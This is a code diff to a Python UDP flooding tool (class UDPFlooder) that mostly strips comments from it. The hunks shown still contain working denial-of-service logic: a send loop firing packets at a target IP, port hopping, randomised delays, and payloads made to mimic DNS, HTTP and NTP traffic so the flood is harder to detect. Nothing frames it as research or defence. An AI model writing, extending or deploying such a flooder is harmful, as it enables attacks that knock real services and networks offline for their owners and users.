@@ -43,13 +43,12 @@ class UDPFlooder:
         return random.randint(1024, 65535)
     
     def generate_stealth_payload(self):
-        # Mimic common protocols
         protocols = {
             'dns': b'\x00\x01\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00',
             'http': b'GET / HTTP/1.1\r\nHost: example.com\r\n\r\n',
             'ntp': b'\x1b' + random._urandom(47)
         }
-        if random.random() > 0.7:  # 30% chance to use protocol mimic
+        if random.random() > 0.7: 
             return random.choice(list(protocols.values()))
         return random._urandom(self.packet_size)
         
@@ -73,24 +72,18 @@ class UDPFlooder:
     
         while self.running:
             try:
-            # Stealth features
                 if self.stealth:
                     current_time = time.time()
-                # Port hopping
                     if current_time - self.last_port_change > self.port_hopping_interval:
                         self.port = self.random_port()
                         self.last_port_change = current_time
                 
-                # Random delay
                     delay = random.uniform(self.min_delay, self.max_delay)
                     time.sleep(delay)
-                
-                # Random packet size and content
+
                     data = self.generate_stealth_payload()
                 else:
                     data = random._urandom(self.packet_size)
-            
-            # Removed the IP spoofing attempt as it causes problems on Windows
             
                 start_packet = time.time()
                 sock.sendto(data, (self.target_ip, self.port))
@@ -187,9 +180,9 @@ class UDPFlooder:
     
     def get_status_color(self):
         return {
-            "OPTIMAL": "\033[32m",  # Verde
-            "STABLE": "\033[33m",   # Giallo
-            "DEGRADED": "\033[31m"  # Rosso
+            "OPTIMAL": "\033[32m",  
+            "STABLE": "\033[33m",   
+            "DEGRADED": "\033[31m" 
         }.get(self.connection_quality, "\033[0m")
     
     def show_stats(self):
